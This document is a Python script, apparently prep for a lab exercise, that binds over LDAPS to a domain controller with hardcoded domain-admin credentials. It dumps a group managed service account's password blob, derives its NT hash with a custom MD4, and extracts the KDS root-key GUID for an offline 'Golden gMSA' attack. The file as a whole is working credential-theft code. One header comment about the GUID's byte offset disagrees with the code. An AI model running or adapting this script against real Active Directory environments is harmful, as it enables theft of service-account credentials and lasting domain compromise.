# WT098 prep - read gmsaTools$ metadata as DA for the offline Golden gMSA compute
# Outputs: SID, msDS-ManagedPasswordId (base64), current NT hash (MD4), the
# KDS root-key GUID referenced by the pwdid (first 16 bytes).
import struct, base64, sys
from ldap3 import Server, Connection, NTLM, ALL

# ---- pure MD4 (matches t024) ----
def md4(data: bytes) -> bytes:
    A, B, C, D = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    F = lambda x, y, z: (x & y) | (~x & z)
    G = lambda x, y, z: (x & y) | (x & z) | (y & z)
    H = lambda x, y, z: x ^ y ^ z
    shifts = [[3, 7, 11, 19] * 4, [3, 5, 9, 13] * 4, [3, 9, 11, 15] * 4]
    msg = bytearray(data); ml = len(msg) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56: msg.append(0)
    msg += struct.pack('<Q', ml & 0xFFFFFFFFFFFFFFFF)
    def rol(x, n): return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
    for off in range(0, len(msg), 64):
        block = msg[off:off+64]
        X = list(struct.unpack('<16I', block))
        a, b, c, d = A, B, C, D
        for i in range(16):
            k = i; a = rol((a + F(b, c, d) + X[k]) & 0xFFFFFFFF, shifts[0][i % 4]); a, b, c, d = d, a, b, c
        for i in range(16):
            k = (i % 4) * 4 + (i // 4)
            a = rol((a + G(b, c, d) + X[k] + 0x5A827999) & 0xFFFFFFFF, shifts[1][i % 4]); a, b, c, d = d, a, b, c
        order3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for i in range(16):
            k = order3[i]
            a = rol((a + H(b, c, d) + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, shifts[2][i % 4]); a, b, c, d = d, a, b, c
        A = (A + a) & 0xFFFFFFFF; B = (B + b) & 0xFFFFFFFF; C = (C + c) & 0xFFFFFFFF; D = (D + d) & 0xFFFFFFFF
    return struct.pack('<4I', A, B, C, D)

server = Server('192.168.77.10', port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user='cadre.local\\chief_command', password='C0mm@nd_Ch1ef!', authentication=NTLM, auto_bind=True)
print('LDAPS_BIND_OK')
conn.search('CN=Managed Service Accounts,DC=cadre,DC=local', '(sAMAccountName=gmsaTools$)',
            attributes=['msDS-ManagedPassword', 'msDS-ManagedPasswordId', 'msDS-ManagedPasswordPreviousId', 'objectSid'])
for e in conn.entries:
    print('DN', e.entry_dn)
    sid_raw = e['objectSid'].raw_values[0] if e['objectSid'].raw_values else None
    if isinstance(sid_raw, bytes):
        rev = sid_raw[0]; subauth = sid_raw[1]
        ia = int.from_bytes(sid_raw[2:8], 'big')  # 48-bit authority, big-endian
        subs = [int.from_bytes(sid_raw[8+i*4:12+i*4], 'little') for i in range(subauth)]
        sid_str = 'S-%d-%d' % (rev, ia) + ''.join('-%d' % s for s in subs)
        print('GMSA_SID', sid_str)
    pid = e['msDS-ManagedPasswordId'].raw_values[0] if e['msDS-ManagedPasswordId'].raw_values else None
    if isinstance(pid, bytes):
        print('PWDID_B64', base64.b64encode(pid).decode())
        print('PWDID_LEN', len(pid))
        if len(pid) >= 40:
            b = pid[24:40]  # CurrentPasswordVersion (KDS root key GUID)
            guid = '%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X' % tuple(b)
            print('PWDID_KEYGUID', guid)
    mp = e['msDS-ManagedPassword'].raw_values[0] if e['msDS-ManagedPassword'].raw_values else None
    if isinstance(mp, bytes):
        version, _r, length = struct.unpack_from('<HHI', mp, 0)
        cur_off, prev_off, _q, _u = struct.unpack_from('<HHHH', mp, 8)
        def wstr(off):
            if off == 0: return None
            end = mp.index(b'\x00\x00', off)
            return mp[off:end]
        cur = wstr(cur_off)
        if cur:
            print('CURRENT_PW_LEN', len(cur))
            print('CURRENT_NTHASH', md4(cur).hex())
conn.unbind()
print('WT098_PREP_DONE')
